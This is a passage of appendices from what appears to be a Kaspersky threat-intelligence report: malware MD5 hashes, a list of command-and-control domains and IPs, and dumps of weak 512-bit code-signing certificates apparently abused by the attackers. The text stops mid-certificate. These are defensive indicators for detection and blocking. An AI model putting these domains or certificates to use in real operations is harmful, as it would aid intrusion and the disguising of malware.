a855b983f1f414461de0e813e2f72b24
ad35db962130becfac1de2f803a119ae
b164febacafd2ab33f203fc5faecd531
b44a988d18264735f39efc2001b29c63
TLP : Green 	        For any inquiries , please contact intelreports@kaspersky.com
10
bc6a78142fa68af60e4edc06d28a2f28
c25d146b4cf05f7aaa9aebbe8d1563db
c34eb5aa60373119a03cfd90a5fea121
cdf5267225e6994b4670bf49ba50595a
d46204e579808d520affcc71a7d35cda
d73b08376c7cdf355d31b05a71c8c5ba
d8137ded710d83e2339a97ee78494c34
dd6c020e4a9c112c1776215b763f7525
e4fe6fa6e540cdb77807401aa2121858
e52b7d5391152da89b1db64060ba96ae
efda0c1d8593d3ab3a7c079b71a0f2bc
f7d0d5fc6b01a2e0f3a1c021bab49437
fcd2458376398b0be09eaa34f4f4d091
e8bfb82b0dd5cef46116d61f62c25060
a47f6878da6480089c2ff3bdddbd7104
9f56c7f03370692f1d4761ddb848daf5
3e38b8ccd38682ad4ec1f0fcfc1fb16a
b5ab66687d53914a65447aacc8fb3e88
fda0320d1e28bc022e4d9e9aae544db4
29d76d34d8878f7ac703837ec774f26a
1bfc1b606fc8aa85e1094b01b08eafd6
64c4d56457516a646d10732f24214cf2
3e38b8ccd38682ad4ec1f0fcfc1fb16a
b5ab66687d53914a65447aacc8fb3e88
2600671b87dedbb50ca728285eb141b8
5b7b8d3b844b4dbc22875a2a6866a862
da608f216594653a1716edd5734cd6e1
cd1134ad11d21b4626e28cf5a9eb6f0c
53bc1a9d19aae7f783e019ec7613c366
ebe6b78006ecffe1511f46c86d16f4aa
c2d00fef0659640c1345967d2f554278
fe95141837ae86cb02a1bbf6a070cbb4
a0b0389eb9bbfe1839d3da7a1995da3f
822871578022c1292c9cb051cceedfe2
ca7e5ff32b729d0d61340911a01a479a
35cd5ca2e33400a67345b00ef6db3ff6
TLP : Green 	        For any inquiries , please contact intelreports@kaspersky.com
11
a45e0f8a404d846289f3a223253e94a9
8c3fc5e341d7df51ea9b781a55908e82
e8190374c3d962f5c2cbb5e30007216c
9a0963dbee2361fa9cebaa6e0e517774
397e492f1f65ed9a3c3edc9c7a938f01
TLP : Green 	         For any inquiries , please contact intelreports@kaspersky.com
12
Appendix B. Fully Qualified Domain Names ,
Command and Control
163pics.net                                 autobicycle.20x.cc
163services.com                             autobicycle.freehostking.com
180.235.132.99                              autobicyyyyyy.50gigs.net
203.146.249.178                             autoblank.oni.cc
22283.bodis.com                             autobrown.gofreeserve.com
42world.net                                 autocargo.100gbfreehost.com
59.188.31.24                                autocash.000php.com
88dafa.biz                                  autocashhh.hostmefree.org
academyhouse.us                             autocaze.crabdance.com
ackr.myvnc.com                              autocheck.000page.com
acrobatup.com                               autochecker.myftp.biz
adobearm.com                                autocracy.phpnet.us
adobeplugs.net                              autocrat.comuf.com
adoberegister.flashserv.net                 autodoor.freebyte.us
adobeupdates.com                            autof888com.20x.cc
albasrostga.com                             autofseven.freei.me
alexa97.com0                                autogeremys.com
alphacranes.com                             autoinsurance.000space.com
alphastros.com                              autojob.whostas.com
amanity50.biz                               autoken.scienceontheweb.net
anti-wars.org                               autolace.twilightparadox.com
applyinfo.org                               automachine.servequake.com
auto2115.icr38.net                          automatic.waldennetworks.com
auto2116.phpnet.us                          automation.000a.biz
auto24col.info                              automation.icr38.net
autobaba.net84.net                          automobile.000a.biz
autoban.phpnet.us                           automobile.200gigs.com
autobicy.yaahosting.info                    automobile.freei.me
TLP : Green 	               For any inquiries , please contact intelreports@kaspersky.com
13
automobile.it.cx                         autoupdatefree.zoka.cc
automobile.megabyet.net                  autoupdatefreee.my5gigs.com
automobile.x4host.eu                     autoupdates.5gigs.net
automobiles.strangled.net                autoupdatfreeee.coolwwweb.com
automotive.20x.cc                        autoupgrade.awardspace.biz
autonomy.host22.com                      autovita.xtreemhost.com
autopapa.noads.biz                       autovonmanstein.x10.mx
autopara.oliwy.net                       autoworld.serveblog.net
autoparts.phpnet.us                      autozone.000space.com
autopatch.createandhost.com              begatrendsone.com
autopatch.verwalten.ch                   begatrials.com
autophile.00free.net                     bizannounce.com
autopilot.verwalten.ch                   blonze.createandhost.com
autoplant.byethost11.com                 bluecat.biz.nf
autopsy.createandhost.com                bluemagazines.servegame.com
autoreviews.dyndns.info                  bokselpa.dasfree.com
autorico.ignorelist.com                  checkingvirusscan.com
autosadeo.000php.com                     clus89.crabdance.com
autosail.ns01.biz                        codec.servepics.com
autoshop.hostmefree.org                  control.wrizx.net
autostart.waldennetworks.com             cranseme.ignorelist.com
autotest.byethost4.com                   crazymand.twilightparadox.com
autotree.freebyte.us                     crendesting.strangled.net
autoup.eu.pn                             dailybread.waldennetworks.com
autoupdafree.my5gigs.com                 dailyissue.net
autoupdate.eg.vg                         dailynews.000page.com
autoupdate.freehostia.com                dailypatch-rnr2008.net
autoupdate.megabyet.net                  dailysummary.net
autoupdate.zoka.cc                       dailyupdate.110mb.com
autoupdatefree.freehostia.com            domainmanagemenet.com
autoupdatefree.verwalten.ch              donatewa.phpnet.us
autoupdatefree.waldennetworks.com        downsw.onlinewebshop.net
TLP : Green 	            For any inquiries , please contact intelreports@kaspersky.com
14
dpc.servegame.com                         humanforum.net
ds505cam.com                              hummfoundation.org
ebizcentres.com                           individuals.sytes.net
elibrarycentre.com                        infonetworks.biz
err.cloins.com                            innewsmessenger.com
eztwt.com                                 jackie311.byethost16.com
fame.mooo.com                             jandas.byethost7.com
fashions.0fees.net                        javaupdate.flashserv.net
fenraw.northgeremy.info                   jonejokoss.byethost6.com
fenrix.yaahosting.info                    jonemaccane1.byethost7.com
fenrmi.eu.pn                              jpnspts.biz
foreignaffair.org                         jpqueen.biz
gamepia008.my5gigs.com                    kaoal.chickenkiller.com
genelousmanis.phpnet.us                   laborsforum.org
generalemountina.com                      lakers.jumpingcrab.com
genuinsman.phpnet.us                      limited.000space.com
gigahermes.com                            lookasjames.000space.com
gigamiros.zyns.com                        mansgepitostraig.com
gigathread.itemdb.com                     mechanicalcomfort.net
gigatrend.org                             microalba.serveftp.com
giveaway.6te.net                          microblo5.mooo.com
goathoney.biz                             microbrownys.strangled.net
goizmi.ignorelist.com                     microchiefs.twilightparadox.com
goizmi.phpnet.us                          microchisk.mooo.com
goldblacktree.waldennetworks.com          microchsse.strangled.net
gphpnet.phpnet.us                         microdelta.crabdance.com
greatechangemind.com                      microgenuinsman.servebeer.com
greenlabelstud.000space.com               microjonjokoss.jumpingcrab.com
gurunichi.createandhost.com               microlilics.000space.com
halemdus.000space.com                     microlilics.crabdance.com
heinzmarket.com                           micromacrarusn.com
hotemup.icr38.net                         micromacs.org
TLP : Green 	             For any inquiries , please contact intelreports@kaspersky.com
15
micromichi.ezua.com                        pb.qocp.net
micromps1.net                              pb.upinfo.biz
micronames.jumpingcrab.com                 photo.eonlineworld.com
micronao.hopto.org                         popin.0fees.net
micronaoko.jumpingcrab.com                 private.neao.biz
microos.jumpingcrab.com                    proteingainer.biz
microplants.strangled.net                  rainbowbbs.mywebcommunity.org
microsoft-xpupdate.com                     rayp.biz
microyours.ignorelist.com                  re.policyforums.org
minshatopas12.org                          redblacksleep.createandhost.com
msdn4updates.com                           redlooksman.servehttp.com
mshotfix.com                               reportinshop.com
msupdates.com                              reportinside.net
myhome.serveuser.com                       rootca.000space.com
myphone.freei.me                           sales.eu5.org
nanogalsman.org                            secureonline.net
nanomicsoft.com                            self-makeups.com
nanoocspos.com                             self-makingups.com
nanosleepss.net                            sellingconnection.org
ncnbroadcasting.reportinside.net           sens.humanforum.net
neao.biz                                   shndia.com
neosilba.com                               silverbell.000space.com
new.freecinemaworld.net                    sipapals.servehalflife.com
new.islamicawaken.com                      smartappactiv.com
newsagencypool.com                         smartnewup.crabdance.com
newsdailyinhk.com                          sourcecodecenter.org
newsups.000a.biz                           spotnews.com
nokasblog.agilityhoster.com                st.cloins.com
officerevision.com                         stloelementry.200gigs.com
online.usean.biz                           students.serveblog.net
outlookz.com                               support¬forum.org
pb.enewslive.org                           terryblog.110MB.com
TLP : Green 	              For any inquiries , please contact intelreports@kaspersky.com
16
thenewesthta.mypressonline.com           upgrade77.steadywebs.com
thirdbase.bugs3.com                      video.humorme.info
todaynewscentre.net                      voicemailz.net
tradeinf.com                             wein.isgreat.org
unknown12.ignorelist.com                 windowservices.net
updaairpush.ignorelist.com               world.issuetoday.net
updaily.biz.nf                           world.uktimesnews.com
updaily.phpnet.us                        wowhome.byethost8.com
updaisin.net16.net                       ww42.200gigs.com
updalsim.freehostee.com                  www.appfreetools.com
updarling.000a.biz                       www.digitalimagestudy.com
updatable.20x.cc                         www.imggoogle.com
updateall.000a.biz                       www.info-cache.net
updatecache.net                          www.mobilitysvc.com
updatefast.000a.biz                      www.neosilba.com
updateiphone.20x.cc                      www.newsupdates.org
updateitunes.waldennetworks.com          www.serveblog.net
updatejava.megabyet.net                  www.singlehost.org
updatepatch.icr38.net                    www.smartnewup.com
updateschedule.verwalten.ch              www.sqlengine.net
updatesw.110mb.com                       www.strangled.net
updatesw.zoka.cc                         www.universalonline.com
updatewell.freebyte.us                   www.win7smartupdate.com
updatewifis.dyndns-wiki.com              yahooservice.biz
updauganda.waldennetworks.com            yellowleos.phpnet.us
updawn4you.net84.net                     ypiz.net
TLP : Green 	            For any inquiries , please contact intelreports@kaspersky.com
17
Appendix C. Code - signing certificates
Certificate :
Data :
Version : 3 ( 0x2 )
Serial Number : 2576597 ( 0x2750d5 )
Signature Algorithm : sha1WithRSAEncryption
Issuer : C = MY , O = Digicert Sdn . Bhd . , OU=457608 K ,
CN = Digisign Server ID ( Enrich )
Validity
Not Before : Jun 2 03:55:56 2009 GMT
Not After : Jun 2 03:55:56 2011 GMT
Subject : C = MY , O = JARING Communications Sdn . Bhd . ,
OU = JARING , CN = webmail.jaring.my ,
L=W.Persekutuan/emailAddress=sysadmin@jaring.my ,
ST = Kuala Lumpur
Subject Public Key Info :
Public Key Algorithm : rsaEncryption
PublicKey : ( 512 bit )
Modulus :
00:a4:81:6d:8d : e4:a6:fa:64:68:c8:41:4b : f3:08 :
89:c6:8c : f5:52:c5:64:00:7a : a4:00:29:be : fb : e6 :
c8:b7:92:de:52:71:f8:23:27:16:8e:4f:59:c4:c3 :
52:2c : b2:7e:72:d9:b1:88:ae : a5:23:01:2d:5b:63 :
dd:8d:49:1e:8f
Exponent : 65537 ( 0x10001 )
X509v3 extensions :
X509v3 Subject Key Identifier :
41:6B : A5:9E:58:E5:29:B7
X509v3 Certificate Policies :
Policy : 2.16.458.1.1
CPS : http://www.digicert.com.my/cps.htm
X509v3 Authority Key Identifier :
keyid : C6:16:93:4E:16:17:EC:16:AE:8C:94:76:F3:86:6D : C
5:74:6E:84:77
X509v3 Key Usage :
Digital Signature , Non Repudiation , Key
Encipherment , Data Encipherment
Signature Algorithm : sha1WithRSAEncryption
57:b9:37:76:d1:c4:95:5d : cf:20:51:ea : c5:92:ad:7e:24:a7 :
TLP : Green 	          For any inquiries , please contact intelreports@kaspersky.com
18
78:d2:92:c1:76:45:c6:0f:6e:84:35:15:aa:82:8b:42:55:1d :
e0:8a:8e:86:13:de:98:02:8e:25:2b:24:a8:8b:84:a2:36:37 :
f4:f6:1d:81:1b:96:c7:ee:2d : f9:68:fe:78:98:8b : bb:5a : a0 :
bb:40:03:b2:ca:6b:84:12:e8:c4:cd : df : ad:9d:66:c7:75:08 :
60:5b : e3:04:de : bf:25:99:fb : d1:5a:12:b1:d9:a8:c3:48:19 :
ed : bf : dc : b7:5f : ff:8e : cf:37:2b:24:65:e5:3f : b9:b2:63:cc :
cf:5c
BEGIN CERTIFICATE
MIIC2TCCAkKgAwIBAgIDJ1DVMA0GCSqGSIb3DQEBBQUAMGMxCzAJBgNVBAYTAk1Z
MRswGQYDVQQKExJEaWdpY2VydCBTZG4uIEJoZC4xETAPBgNVBAsTCDQ1NzYwOC1L
MSQwIgYDVQQDExtEaWdpc2lnbiBTZXJ2ZXIgSUQgKEVucmljaCkwHhcNMDkwNjAy
MDM1NTU2WhcNMTEwNjAyMDM1NTU2WjCBtjELMAkGA1UEBhMCTVkxJzAlBgNVBAoT
HkpBUklORyBDb21tdW5pY2F0aW9ucyBTZG4uQmhkLjEPMA0GA1UECxMGSkFSSU5H
MRowGAYDVQQDExF3ZWJtYWlsLmphcmluZy5teTEWMBQGA1UEBxMNVy5QZXJzZWt1
dHVhbjEhMB8GCSqGSIb3DQEJARYSc3lzYWRtaW5AamFyaW5nLm15MRYwFAYDVQQI
Ew1LdWFsYSBMdW1wdXIgMFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAKSBbY3kpvpk
aMhBS / MIicaM9VLFZAB6pAApvvvmyLeS3lJx+CMnFo5PWcTDUiyyfnLZsYiupSMB
LVtj3Y1JHo8CAwEAAaOBijCBhzARBgNVHQ4ECgQIQWulnljlKbcwRAYDVR0gBD0w
OzA5BgVgg0oBATAwMC4GCCsGAQUFBwIBFiJodHRwOi8vd3d3LmRpZ2ljZXJ0LmNv
bS5teS9jcHMuaHRtMB8GA1UdIwQYMBaAFMYWk04WF+wWroyUdvOGbcV0boR3MAsG
A1UdDwQEAwIE8DANBgkqhkiG9w0BAQUFAAOBgQBXuTd20cSVXc8gUerFkq1+JKd4
0pLBdkXGD26ENRWqgotCVR3gio6GE96YAo4lKySoi4SiNjf09h2BG5bH7i35aP54
mIu7WqC7QAOyymuEEujEzd+tnWbHdQhgW+ME3r8lmfvRWhKx2ajDSBntv9y3X/+O
zzcrJGXlP7myY8zPXA==
END CERTIFICATE
Certificate :
Data :
Version : 3 ( 0x2 )
Serial Number : 2657623 ( 0x288d57 )
Signature Algorithm : sha1WithRSAEncryption
Issuer : C = MY , O = Digicert Sdn . Bhd . , OU=457608 K ,
CN = Digisign Server ID ( Enrich )
Validity
Not Before : Sep 29 06:46:10 2009 GMT
Not After : Sep 29 06:46:10 2011 GMT
Subject : O = MARDI , CN = anjungnet.mardi.gov.my , ST = SERDANG
Subject Public Key Info :
TLP : Green 	            For any inquiries , please contact intelreports@kaspersky.com
19
Public Key Algorithm : rsaEncryption
PublicKey : ( 512 bit )
Modulus :
00:ba:4f:4f:7d : e9:62:7a : d5:f8:62:99:0d:29:4c :
af:0e : f4:7d:49:7e:6e : d9:30:d3:06:49:6b : b0:77 :
cd:67:2d : c9:61:55:3d:00:b1:7a : b4:a0:f4:64:61 :
9c:81:38:3e:44:6e:0e:15:a9:58:f9:60:68:a2:29 :
b2:0d:7e:67:71
Exponent : 65537 ( 0x10001 )
X509v3 extensions :
X509v3 Subject Key Identifier :
48:15:99:11:61:48:10:FD
X509v3 Certificate Policies :
Policy : 2.16.458.1.1
CPS : http://www.digicert.com.my/cps.htm
X509v3 Authority Key Identifier :
keyid : C6:16:93:4E:16:17:EC:16:AE:8C:94:76:F3:86:6D : C
5:74:6E:84:77
X509v3 Key Usage :
Digital Signature , Non Repudiation , Key
Encipherment , Data Encipherment
Signature Algorithm : sha1WithRSAEncryption
8a:89:09:23:6f : ff : bd:7d:0b:45:ff : a8:83:ae : cf : c3:f3:1a :
79:9d : f4:42:22:37:78:b4:6b:7b:86:4f : ee:7a:35:4b:52:8e :
25:25:b3:06:37:1f : f0:bd:72:56:af : d9:b0:cd:48:be:8a:3c :
a2:07:10:1f:7b:62:c9:01:02:47:a9:b8:7f:27:52:13:28:b4 :
c6:a8:5b : e5:57:1a : d3:92:3d:5b:5c : b3:a9:14:cf:1b : ea : fd :
43:48:36:11:9d:85:25:4d : f9:26:84:d8:4d:1a:9c : bd:47:67 :
5f : e6:1d : e7:17:71:71:24:15:68:4e:68:9f : bf:62:10:3e:75 :
83:a2
BEGIN CERTIFICATE
MIICZTCCAc6gAwIBAgIDKI1XMA0GCSqGSIb3DQEBBQUAMGMxCzAJBgNVBAYTAk1Z
MRswGQYDVQQKExJEaWdpY2VydCBTZG4uIEJoZC4xETAPBgNVBAsTCDQ1NzYwOC1L
MSQwIgYDVQQDExtEaWdpc2lnbiBTZXJ2ZXIgSUQgKEVucmljaCkwHhcNMDkwOTI5
MDY0NjEwWhcNMTEwOTI5MDY0NjEwWjBDMQ4wDAYDVQQKEwVNQVJESTEfMB0GA1UE
AxMWYW5qdW5nbmV0Lm1hcmRpLmdvdi5teTEQMA4GA1UECBMHU0VSREFORzBcMA0 G
CSqGSIb3DQEBAQUAA0sAMEgCQQC6T0996WJ61fhimQ0pTK8O9H1Jfm7ZMNMGSWuw
d81nLclhVT0AsXq0oPRkYZyBOD5Ebg4VqVj5YGiiKbINfmdxAgMBAAGjgYowgYcw
EQYDVR0OBAoECEgVmRFhSBD9MEQGA1UdIAQ9MDswOQYFYINKAQEwMDAuBggrBgEF
TLP : Green 	           For any inquiries , please contact intelreports@kaspersky.com
20
BQcCARYiaHR0cDovL3d3dy5kaWdpY2VydC5jb20ubXkvY3BzLmh0bTAfBgNVHSME
GDAWgBTGFpNOFhfsFq6MlHbzhm3FdG6EdzALBgNVHQ8EBAMCBPAwDQYJKoZIhvcN
AQEFBQADgYEAiokJI2//vX0LRf+og67Pw / MaeZ30QiI3eLRre4ZP7no1S1KOJSWz
Bjcf8L1yVq / ZsM1Ivoo8ogcQH3tiyQECR6m4fydSEyi0xqhb5Vca05I9W1yzqRTP
G+r9Q0g2EZ2FJU35JoTYTRqcvUdnX+Yd5xdxcSQVaE5on79iED51g6I=
END CERTIFICATE
Certificate :
Data :
Version : 3 ( 0x2 )
Serial Number :
01:00:00:00:00:01:1e : de : de : a3:da
Signature Algorithm : sha1WithRSAEncryption
Issuer : C = BE , O = Cybertrust , OU = Educational CA ,
CN = Cybertrust Educational CA
Validity
Not Before : Jan 16 08:55:33 2009 GMT
Not After : Jan 16 08:55:33 2012 GMT
Subject : C = GB , ST = England , L = London , O = London Metropolitan
University , OU = ISS , CN = skillsforge.londonmet.ac.uk
Subject Public Key Info :
Public Key Algorithm : rsaEncryption
PublicKey : ( 512 bit )
Modulus :
00:b8:73:f6:45:f2:83:21:4e:66:5d : a8:7d:29:a4 :
aa:21:1e : cb:1e:03:41:dc:1f : cd:1b:2c : d0:f6:3f :
ca : ed:46:f2:be:8f:32:92:1c : a1:69:06:08:db : b9 :
ee : e2:51:bb:9c : bf:68:c3:6f:61:8a : de : e5:be:46 :
5b : c4:bf:44:b9
Exponent : 65537 ( 0x10001 )
X509v3 extensions :
X509v3 Key Usage : critical
Digital Signature , Key Encipherment
X509v3 Authority Key Identifier :
keyid:65:65:A3:3D : D7:3B:11:A3:0A:07:25:37:C9:42:4A:5
B:76:77:50:E1
X509v3 Subject Key Identifier :
14:5A : F5:85:8E : AC:81:77:46:5F:22:70:39:2E:64:E5:EF :
F5:28:E1
X509v3 CRL Distribution Points :
TLP : Green 	          For any inquiries , please contact intelreports@kaspersky.com
21
Full Name :
URI : http://crl.globalsign.net / educational.crl
Authority Information Access :
CA Issuers URI :
http://secure.globalsign.net/cacert/educational.crt
Netscape Cert Type :
SSL Client , SSL Server
Signature Algorithm : sha1WithRSAEncryption
2a : fd:1e : cb : cd:45:42:24:44:32:72:bd:3c : cb:27:31:4a:8b :
2a:25:48:65:06:31:fd:81:5d : ac : e1:5b:6a : ff:96:2a:50:73 :
1e:16:9b:2a:4f:18:ee : fe:26:30:d0:cb:96:f6:11:e6:2b:0f :
95:d1:4b:80:cd : a8:aa:0c:1b:6c : a4:7a:41:af : db:9f:00:b1 :
64:51:d3:db:16:ad:27:98:23:a8:43:dc:3a:2c:17:79:7b:90 :
71:fa : ad:00:9c : ec : d1:24:b7:ba:81:de:35:e9:d6:fe : a0:92 :
46:69:b2:86:36:04:57:ba:9b : b0:92:24:e9:44:2b : ca : d8:09 :
54:b0:2d:64:21:24:c0:d4:77:86:de:77:04:2b : f2:6b : a8:1d :
de:9b:5b : df:32:d3:45:ee:32:e6:60:a6:07:77:02:ef:98:d1 :
9d : de:40:3b:42:74:dd : c6:da : bb:2f:1a:42:58:93:db:2e:1f :
f9:23:41:ab : e7:63:c7:1c : d3:ec : f3:bf:60:41:64:0c : ef:22 :
b3:a0:cb : ae : bd:32:0e:0f:3c:00:13:b0:32:47:62:b5:aa:22 :
7b:76:0b : d2:f2:f5:eb:92:c8:f8:6c:9d : d3:ad : f7:f1:b9:c6 :
94:51:31:5a : e8:1b:68:76:d4:3a:00:83:b3:3f : ef:03:a2:d2 :
c5:25:d8:d4
BEGIN CERTIFICATE
MIIDnjCCAoagAwIBAgILAQAAAAABHt7eo9owDQYJKoZIhvcNAQEFBQAwXzELMAkG
A1UEBhMCQkUxEzARBgNVBAoTCkN5YmVydHJ1c3QxFzAVBgNVBAsTDkVkdWNhdGlv
bmFsIENBMSIwIAYDVQQDExlDeWJlcnRydXN0IEVkdWNhdGlvbmFsIENBMB4XDTA5
MDExNjA4NTUzM1oXDTEyMDExNjA4NTUzM1owgY0xCzAJBgNVBAYTAkdCMRAwDgYD
VQQIEwdFbmdsYW5kMQ8wDQYDVQQHEwZMb25kb24xJzAlBgNVBAoTHkxvbmRvbiBN
ZXRyb3BvbGl0YW4gVW5pdmVyc2l0eTEMMAoGA1UECxMDSVNTMSQwIgYDVQQDExtz
a2lsbHNmb3JnZS5sb25kb25tZXQuYWMudWswXDANBgkqhkiG9w0BAQEFAANLADBI
AkEAuHP2RfKDIU5mXah9KaSqIR7LHgNB3B / NGyzQ9j / K7Ubyvo8ykhyhaQYI27nu
4lG7nL9ow29hit7lvkZbxL9EuQIDAQABo4HzMIHwMA4GA1UdDwEB / wQEAwIFoDAf
BgNVHSMEGDAWgBRlZaM91zsRowoHJTfJQkpbdndQ4TAdBgNVHQ4EFgQUFFr1hY6s
gXdGXyJwOS5k5e/1KOEwOgYDVR0fBDMwMTAvoC2gK4YpaHR0cDovL2NybC5nbG9i
YWxzaWduLm5ldC9lZHVjYXRpb25hbC5jcmwwTwYIKwYBBQUHAQEEQzBBMD8GCCsG
AQUFBzAChjNodHRwOi8vc2VjdXJlLmdsb2JhbHNpZ24ubmV0L2NhY2VydC9lZHVj
YXRpb25hbC5jcnQwEQYJYIZIAYb4QgEBBAQDAgbAMA0GCSqGSIb3DQEBBQUAA4IB
AQAq / R7LzUVCJEQycr08yycxSosqJUhlBjH9gV2s4Vtq/5YqUHMeFpsqTxju / iYw
TLP : Green 	           For any inquiries , please contact intelreports@kaspersky.com
22
0MuW9hHmKw+V0UuAzaiqDBtspHpBr9ufALFkUdPbFq0nmCOoQ9w6LBd5e5Bx+q0A
nOzRJLe6gd416db+oJJGabKGNgRXupuwkiTpRCvK2AlUsC1kISTA1HeG3ncEK / Jr
qB3em1vfMtNF7jLmYKYHdwLvmNGd3kA7QnTdxtq7LxpCWJPbLh/5I0Gr52PHHNPs
879gQWQM7yKzoMuuvTIODzwAE7AyR2K1qiJ7dgvS8vXrksj4bJ3TrffxucaUUTFa
6BtodtQ6AIOzP+8DotLFJdjU
END CERTIFICATE
Certificate :
Data :
Version : 3 ( 0x2 )
Serial Number : 19771 ( 0x4d3b )
Signature Algorithm : sha1WithRSAEncryption
Issuer : C = US , O = Anthem Inc , OU = Ecommerce , CN = Anthem Inc
Certificate Authority
Validity
Not Before : Apr 22 18:15:10 2009 GMT
Not After : Apr 22 18:15:10 2010 GMT
Subject : C = US , ST = Indiana , L = Indianapolis , O = Anthem
Insurance Company Inc , OU = EBusiness , CN = ahi.anthem.com
Subject Public Key Info :
Public Key Algorithm : rsaEncryption
PublicKey : ( 512 bit )
Modulus :
00:d4:95:e5:13:d8:7f:91:27:29:f6:76:72:9a:13 :
a6:e2:4b : ec:16:ed : fc : a5:d8:f9:a1:f3:57:4b:85 :
56:ec : ca:80:9f:0c:23:9d:36:45:db : ee : a8:ee:47 :
b7:33:21:e4:93:72:7d:00:02:98:08:d8:88:c9:45 :
b5:22:cc : bc:77
Exponent : 65537 ( 0x10001 )
X509v3 extensions :
X509v3 Basic Constraints : critical
CA : FALSE
X509v3 Subject Alternative Name :
email:dlaitmiddleware@anthem.com
X509v3 Key Usage : critical
Key Encipherment
X509v3 Authority Key Identifier :
keyid : FA:1A : DC:3E:5D : A6:B5:FD : FA:5F:6C : CB:28:40:D3:E
0:97:A2:AA : AC
TLP : Green 	          For any inquiries , please contact intelreports@kaspersky.com
23
DirName:/C = US / O = GTE Corporation / OU = GTE CyberTrust
Solutions , Inc./CN = GTE
CyberTrust Global Root
serial:07:27:16:11
X509v3 Subject Key Identifier :
6B:46:CC : B6:F4:8F:05:14:46:5D : D8:23:B8:05:73:E3:58 :
7E : D6:A6
Signature Algorithm : sha1WithRSAEncryption
71:72:2a : c2:fc:70:13:d6:7a : a7:08:50:f2:e5:c9:7d:61:e8 :
3d : bd:98:89:2a:76:3f:16:1e : c1:2d:31:8b:81:b6:95:83:5b :
d3:48:35:3d:78:9a : e3:76:c9:89:a0:8a:74:a0:cd : ae:56:cf :
30:c7:72:d2:72:d0:aa:4b:9c:18:13:41:90:30:45:6d : bd:24 :
d4:88:1e:83:f3:ef : ac : d7:c3:6f:82:2d:10:20:d6:06:01:36 :
45:50:13:b4:32:6b:39:73:c9:7d:67:84:d4:ab:87:fc : c9:2a :
8d : ee:63:7a : e2:f1:8c:4a:47:7f:3a : cb:6e:68:a2:c1:32:c6 :
04:e6:7a:35:45:46:05:99:29:90:2e : a8:2e : dd:8a : d4:8c:31 :
2e:77:57:84:62:87:fa : e1:60:2a:2a : e7:15:4c:4b:18:0d : a7 :
a2:cb : d6:32:ae:40:73:51:65:76:df:08:d4:f5:fa : a9:d9:c3 :
d4:5f:12:dc : ca : cd:4d:1e : ca : de:9f : c3:c9:5d:53:4c : d2:54 :
14:43:e5:d8:2b:9c:7c:7e : da:33:d7:69:80:43:dd:96:3d:64 :
aa:91:63:5f:48:50:7b:33:d7:85:3a : a9:d7:74:71:da:4a:82 :
cf : b1:14:82:f6:95:72:d8:a9:24:3e : b4:14:94:0c:17:2c:6f :
8a:93:1a : a2
BEGIN CERTIFICATE
MIIDsTCCApmgAwIBAgICTTswDQYJKoZIhvcNAQEFBQAwYTELMAkGA1UEBhMCVVMx
EzARBgNVBAoTCkFudGhlbSBJbmMxEjAQBgNVBAsTCUVjb21tZXJjZTEpMCcGA1UE
AxMgQW50aGVtIEluYyBDZXJ0aWZpY2F0ZSBBdXRob3JpdHkwHhcNMDkwNDIyMTgx
NTEwWhcNMTAwNDIyMTgxNTEwWjCBijELMAkGA1UEBhMCVVMxEDAOBgNVBAgTB0lu
ZGlhbmExFTATBgNVBAcTDEluZGlhbmFwb2xpczElMCMGA1UEChMcQW50aGVtIElu
c3VyYW5jZSBDb21wYW55IEluYzESMBAGA1UECxMJRUJ1c2luZXNzMRcwFQYDVQQD
Ew5haGkuYW50aGVtLmNvbTBcMA0GCSqGSIb3DQEBAQUAA0sAMEgCQQDUleUT2H+R
Jyn2dnKaE6biS+wW7fyl2Pmh81dLhVbsyoCfDCOdNkXb7qjuR7czIeSTcn0AApgI
2IjJRbUizLx3AgMBAAGjggEPMIIBCzAMBgNVHRMBAf8EAjAAMCcGA1UdEQQgMB6B
HGRsLWFpdC1taWRkbGV3YXJlQGFudGhlbS5jb20wDgYDVR0PAQH / BAQDAgUgMIGi
BgNVHSMEgZowgZeAFPoa3D5dprX9+l9syyhA0+CXoqqsoXmkdzB1MQswCQYDVQQG
EwJVUzEYMBYGA1UEChMPR1RFIENvcnBvcmF0aW9uMScwJQYDVQQLEx5HVEUgQ3li
ZXJUcnVzdCBTb2x1dGlvbnMsIEluYy4xIzAhBgNVBAMTGkdURSBDeWJlclRydXN0
IEdsb2JhbCBSb290ggQHJxYRMB0GA1UdDgQWBBRrRsy29I8FFEZd2CO4BXPjWH7W
pjANBgkqhkiG9w0BAQUFAAOCAQEAcXIqwvxwE9Z6pwhQ8uXJfWHoPb2YiSp2PxYe
TLP : Green 	           For any inquiries , please contact intelreports@kaspersky.com
24
wS0xi4G2lYNb00g1PXia43bJiaCKdKDNrlbPMMdy0nLQqkucGBNBkDBFbb0k1Ige
g / PvrNfDb4ItECDWBgE2RVATtDJrOXPJfWeE1KuH / Mkqje5jeuLxjEpHfzrLbmii
wTLGBOZ6NUVGBZkpkC6oLt2K1IwxLndXhGKH+uFgKirnFUxLGA2nosvWMq5Ac1Fl
dt8I1PX6qdnD1F8S3MrNTR7K3p / DyV1TTNJUFEPl2CucfH7aM9dpgEPdlj1kqpFj
X0hQezPXhTqp13Rx2kqCz7EUgvaVctipJD60FJQMFyxvipMaog==
END CERTIFICATE
Certificate :
Data :
Version : 3 ( 0x2 )
Serial Number : 1707608080 ( 0x65c80810 )
Signature Algorithm : sha1WithRSAEncryption
Issuer : C = TW , O = TAIWANCA .
COM Inc. , OU = SSL Certification Service Provider ,
CN = TaiCA Secure CA
Validity
Not Before : Jul 2 06:34:05 2010 GMT
Not After : Jul 17 15:59:59 2011 GMT
Subject : C = TW , ST = Taipei , L = Taipei , O = TRADEVAN ,
OU = TRADEVAN , CN = www.esupplychain.com.tw
Subject Public Key Info :
Public Key Algorithm : rsaEncryption
PublicKey : ( 512 bit )
Modulus :
00:d2:80:52:89:4d : eb : b7:dd:56:41:56:09:71:ce :
87:a0:ad:1d:27:c1:a5:e3:94:27:1b:22:f0:d5:6c :
3c : d5:23:df:0a:22:b9:a0:19:53:5d:85:7e : ca:2a :
51:4d:7d:24:c3:d0:64:0a:52:eb:84:59:f2:2e:68 :
c3:d8:bf:13:d1
Exponent : 65537 ( 0x10001 )
X509v3 extensions :
X509v3 Authority Key Identifier :
keyid : D4:85:27:D2:27:A4:BE : AB:5E:2F:41:1B : EA:52:24:3
9:99:4E:46:2E
X509v3 Subject Key Identifier :
4B : EC : AE : F9:6A:02:DF:92:0A:0D:6B : FC : B9:5A : C0:77:BB :
1E:56:D4
X509v3 CRL Distribution Points :
Full Name :
